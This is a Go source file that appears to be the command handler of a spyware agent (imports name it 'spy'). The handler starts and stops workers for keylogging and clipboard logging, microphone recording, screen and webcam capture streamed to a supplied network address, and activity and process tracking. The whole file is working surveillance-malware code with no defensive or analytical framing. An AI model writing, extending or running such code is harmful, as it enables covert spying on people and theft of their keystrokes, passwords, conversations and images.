package ipc

import (
	"errors"
	"fmt"
	"strings"

	"github.com/cinus-ue/spy/agent/keylogger"
	"github.com/cinus-ue/spy/agent/microphone"
	"github.com/cinus-ue/spy/agent/screen"
	"github.com/cinus-ue/spy/agent/tracker"
	"github.com/cinus-ue/spy/agent/webcam"
	"github.com/cinus-ue/spy/literr"
	"github.com/cinus-ue/spy/util"
)

var workers = make(map[string]worker, 10)

func HandleCommand(command string) (string, error) {
	args := util.ParseArgs(command)
	if len(args) == 0 {
		return failure, errors.New("spy command cannot be empty")
	}
	switch args[0] {
	case "key":
		w := &KeyWorker{}
		regWorker("key", w)
		if err := w.Run(nil); err != nil {
			return failure, err
		}
	case "mic":
		w := &MicWorker{}
		regWorker("mic", w)
		if err := w.Run(nil); err != nil {
			return failure, err
		}
	case "scr":
		if len(args) < 3 {
			return failure, literr.ArgsError
		}
		w := &ScrWorker{}
		regWorker("scr", w)
		if err := w.Run(args[1:]); err != nil {
			return failure, err
		}
	case "cam":
		if len(args) < 3 {
			return failure, literr.ArgsError
		}
		w := &CamWorker{}
		regWorker("cam", w)
		if err := w.Run(args[1:]); err != nil {
			return failure, err
		}
	case "tkr":
		if len(args) < 3 {
			return failure, literr.ArgsError
		}
		w := &TrackWorker{}
		regWorker("tkr", w)
		if err := w.Run(args[1:]); err != nil {
			return failure, err
		}
	case "stop":
		if len(args) < 2 {
			return failure, literr.ArgsError
		}
		if w, ok := workers[args[1]]; ok {
			if err := w.Stop(); err != nil {
				return failure, err
			}
			delete(workers, args[1])
			return success, nil
		}
		return failure, errors.New("spy worker not found")
	case "workers":
		var list []string
		for name := range workers {
			list = append(list, name)
		}
		if len(list) > 0 {
			return fmt.Sprintf("[ %s ]", strings.Join(list, ", ")), nil
		}
		return "[ ]", nil
	default:
		return failure, fmt.Errorf("'%s' is not a valid command", command)
	}
	return success, nil
}

func regWorker(name string, w worker) {
	if w, ok := workers[name]; ok {
		literr.CheckError(w.Stop())
		delete(workers, name)
	}
	workers[name] = w
}

type worker interface {
	Run(args []string) error
	Stop() error
}

type KeyWorker struct {
	logger *keylogger.Keylogger
}

func (w *KeyWorker) Run([]string) error {
	logger, err := keylogger.NewKeylogger(60*24, true, true)
	if err != nil {
		return err
	}
	w.logger = logger
	go logger.RunKeyboardLogger()
	go logger.RunClipboardLogger()
	return nil
}

func (w *KeyWorker) Stop() error {
	w.logger.Close()
	return nil
}

type MicWorker struct {
	recorder *microphone.MicRecorder
}

func (w *MicWorker) Run([]string) error {
	recorder, err := microphone.NewMicRecorder(util.FileNameFormat("mic", ".wav"))
	if err != nil {
		return err
	}
	w.recorder = recorder
	go func() {
		if literr.CheckError(recorder.RecordWav()) {
			return
		}
	}()
	return nil
}

func (w *MicWorker) Stop() error {
	w.recorder.Close()
	return nil
}

type ScrWorker struct {
	capture *screen.Capture
}

func (w *ScrWorker) Run(args []string) error {
	w.capture = &screen.Capture{}
	go func() {
		literr.CheckError(w.capture.StartCapture(screen.Params{
			Address: args[0],
			Display: util.StrToInt(args[1]),
			Quality: 75,
			Verbose: false,
		}))
	}()
	return nil
}

func (w *ScrWorker) Stop() error {
	w.capture.Close()
	return nil
}

type CamWorker struct {
	capture *webcam.Capture
}

func (w *CamWorker) Run(args []string) error {
	w.capture = &webcam.Capture{}
	go func() {
		literr.CheckError(w.capture.StartCapture(webcam.Params{
			Address:  args[0],
			DeviceID: util.StrToInt(args[1]),
			Quality:  75,
			Verbose:  false,
		}))
	}()
	return nil
}

func (w *CamWorker) Stop() error {
	return w.capture.Close()
}

type TrackWorker struct {
	tkr *tracker.Tracker
}

func (w *TrackWorker) Run(args []string) error {
	w.tkr = tracker.NewTracker(util.StrToInt(args[0]), util.StrToInt(args[1]))
	go w.tkr.TrackingActivity()
	go w.tkr.TrackingProcess()
	return nil
}

func (w *TrackWorker) Stop() error {
	w.tkr.Stop()
	return nil
}
